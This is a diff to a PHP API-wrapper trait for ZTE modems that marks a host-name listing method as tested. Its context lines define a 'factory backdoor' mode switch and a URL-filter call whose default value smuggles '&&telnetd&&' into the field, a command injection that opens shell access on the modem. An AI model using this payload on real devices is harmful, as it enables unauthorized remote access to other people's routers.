@@ -62,12 +62,6 @@ trait Hackapi_Zte_modem_Trait {
 		return $this->CallApiGet('sms_data_total', $params);
 	}
 	
-	
-	
-	// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
-	// +++ DRAFT      Not tested                               ++++++++++++++++++
-	// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
-	
 	// -----------------------------------------------------------------------
 	/**
 	* ApiGetHostNameList
@@ -79,7 +73,7 @@ trait Hackapi_Zte_modem_Trait {
 	*/
 	public function ApiGetHostNameList(){
 		$this->DebugLogMethod();
-		$this->HandleApiMethodStateAllowed(1);
+		$this->HandleApiMethodStateAllowed(4);
 		return $this->CallApiGet('hostNameList');
 	}
 	
@@ -277,7 +271,7 @@ trait Hackapi_Zte_modem_Trait {
 		$def['ApiSetChangeMode']=array (  'args' => 'CHANGE_MODE',  'state' => '1',  'type' => 'set',  'call_index' => 'post',  'params' =>   array (    'definitions' =>     array (      'change_mode' => '2',      'password' => '',    ),    'parameters' => '$params=array(		\'change_mode\'	=> $change_mode,		\'password\'	=> $password,	);',    'arguments' => '$change_mode="2", $password=""',    'call_params' => ', $params',    'doc_desc' => '',    'def_value' => '',  ),  'desc' => 'Enable Factory Backdoor?',  'f_state_name' => 'DRAFT',  'f_state_desc' => 'Not tested',  'f_args_call' => '\'CHANGE_MODE\'',  'f_args_txt' => 'CHANGE_MODE',  'f_method_name' => 'ApiSetChangeMode',  'f_call' => 'CallApiPost',);
 		$def['ApiSetUrlFilterAdd']=array (  'args' => 'URL_FILTER_ADD',  'state' => '1',  'type' => 'set',  'call_index' => 'post',  'params' =>   array (    'definitions' =>     array (      'addURLFilter' => 'http://_L33T_H4X0R_/&&telnetd&&',    ),    'parameters' => '$params=array(		\'addURLFilter\'	=> $addURLFilter,	);',    'arguments' => '$addURLFilter="http://_L33T_H4X0R_/&&telnetd&&"',    'call_params' => ', $params',    'doc_desc' => '',    'def_value' => '',  ),  'desc' => 'Exploits Nvram (url encoded as "http%3A%2F%2F_L33T_H4X0R_%2F%26%26telnetd%26%26"?) ',  'f_state_name' => 'DRAFT',  'f_state_desc' => 'Not tested',  'f_args_call' => '\'URL_FILTER_ADD\'',  'f_args_txt' => 'URL_FILTER_ADD',  'f_method_name' => 'ApiSetUrlFilterAdd',  'f_call' => 'CallApiPost',);
 		$def['ApiSetSetWifiInfo']=array (  'args' => 'SET_WIFI_INFO',  'state' => '5',  'type' => 'set',  'call_index' => 'post',  'params' =>   array (    'definitions' =>     array (      'wifiEnabled' =>       array (        0 => '1',        1 =>         array (          0 => 'Disable',          1 => 'Enable',        ),        2 => 'Enable/Disable Wifi',      ),      'm_ssid_enable' =>       array (        0 => '0',        1 =>         array (          0 => 'Disable',          1 => 'Enable',        ),        2 => 'Enable/Disable Multi SSID',      ),    ),    'parameters' => '$params=array(		\'wifiEnabled\'	=> $wifiEnabled,		\'m_ssid_enable\'	=> $m_ssid_enable,	);',    'arguments' => '$wifiEnabled="1", $m_ssid_enable="0"',    'call_params' => ', $params',    'doc_desc' => '* @param string $wifiEnabled	Enable/Disable Wifi : either: Disable | Enable* @param string $m_ssid_enable	Enable/Disable Multi SSID : either: Disable | Enable',    'def_value' => '',  ),  'desc' => 'Wifi Switches',  'f_state_name' => 'FINAL',  'f_state_desc' => 'Fully tested: Params ordered, desc set',  'f_args_call' => '\'SET_WIFI_INFO\'',  'f_args_txt' => 'SET_WIFI_INFO',  'f_method_name' => 'ApiSetSetWifiInfo',  'f_call' => 'CallApiPost',);
-		$def['ApiGetHostNameList']=array (  'args' => 'hostNameList',  'state' => '1',  'type' => 'get',  'call_index' => 'get',  'params' =>   array (    'definitions' => '',    'parameters' => '',    'arguments' => '',    'call_params' => '',    'doc_desc' => '',    'def_value' => '',  ),  'desc' => 'List Host names',  'f_state_name' => 'DRAFT',  'f_state_desc' => 'Not tested',  'f_args_call' => '\'hostNameList\'',  'f_args_txt' => 'hostNameList',  'f_method_name' => 'ApiGetHostNameList',  'f_call' => 'CallApiGet',);
+		$def['ApiGetHostNameList']=array (  'args' => 'hostNameList',  'state' => '4',  'type' => 'get',  'call_index' => 'get',  'params' =>   array (    'definitions' => '',    'parameters' => '',    'arguments' => '',    'call_params' => '',    'doc_desc' => '',    'def_value' => '',  ),  'desc' => 'List Host names',  'f_state_name' => 'TESTED',  'f_state_desc' => 'Params still not ordered or desc not set',  'f_args_call' => '\'hostNameList\'',  'f_args_txt' => 'hostNameList',  'f_method_name' => 'ApiGetHostNameList',  'f_call' => 'CallApiGet',);
 		$def['ApiGetStationList']=array (  'args' => 'station_list',  'state' => '5',  'type' => 'get',  'call_index' => 'get',  'params' =>   array (    'definitions' => '',    'parameters' => '',    'arguments' => '',    'call_params' => '',    'doc_desc' => '',    'def_value' => '',  ),  'desc' => 'List Wifi Clients',  'f_state_name' => 'FINAL',  'f_state_desc' => 'Fully tested: Params ordered, desc set',  'f_args_call' => '\'station_list\'',  'f_args_txt' => 'station_list',  'f_method_name' => 'ApiGetStationList',  'f_call' => 'CallApiGet',);
 	
 		return $def;
